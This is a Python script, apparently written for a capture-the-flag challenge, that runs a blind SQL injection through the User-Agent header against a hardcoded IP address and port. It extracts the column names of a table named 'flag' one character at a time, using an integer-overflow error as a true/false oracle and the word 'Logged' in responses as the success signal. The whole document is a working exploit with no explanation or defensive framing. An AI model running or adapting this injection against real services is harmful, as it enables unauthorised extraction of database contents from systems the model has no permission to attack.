import requests

charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
url = "http://103.97.125.56:31025"

def find_table_name(url, offset):
    table_name = ""
    for index in range(1, 100): 
        found_char = False
        for c in charset:
            headers = {
                'User-Agent': f"', (SELECT CASE WHEN substr((SELECT name FROM pragma_table_info('flag') LIMIT 1 OFFSET {offset}), {index}, 1) = '{c}' THEN 1 ELSE abs(-9223372036854775808) END), null, null, null),(null,'"
            }
            print(f"Testing offset {offset}, index {index}, char: {c}", end="\r")

            try:
                response = requests.post(url, headers=headers)
                response.raise_for_status() 

                if "Logged" in response.text:
                    table_name += c
                    found_char = True
                    print(f"\nFound char: {c}, Current table name: {table_name}")
                    break 

            except requests.exceptions.RequestException as e:
                print(f"\nRequest Error: {e}")
                return None

        if not found_char:
            break

    return table_name


all_table_names = []
for offset in range(20): 
    table_name = find_table_name(url, offset)
    if table_name:
        all_table_names.append(table_name)
        print(f"\n[+] Table name found at offset {offset}: {table_name}")
    else:
        print(f"\n[-] No more table names found at offset {offset}.")
        break 

print("\n[✅] All table names found:")
for name in all_table_names:
    print(name)
print("\n[✅] Finished!!!!!")
